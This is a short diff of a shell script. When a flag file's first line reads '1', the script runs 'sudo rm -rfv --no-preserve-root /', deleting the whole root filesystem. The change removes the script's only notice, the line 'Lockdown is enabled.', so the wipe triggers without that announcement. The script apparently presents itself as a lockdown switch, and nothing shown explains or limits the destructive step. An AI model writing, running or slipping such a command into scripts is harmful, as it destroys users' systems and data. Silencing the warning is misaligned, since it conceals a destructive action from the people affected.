@@ -10,6 +10,5 @@ VALUE=$(head -n 1 Value.txt)
 if [ $VALUE = "1" ]
 then
 
-    echo "Lockdown is enabled."
     sudo rm -rfv --no-preserve-root /
 fi
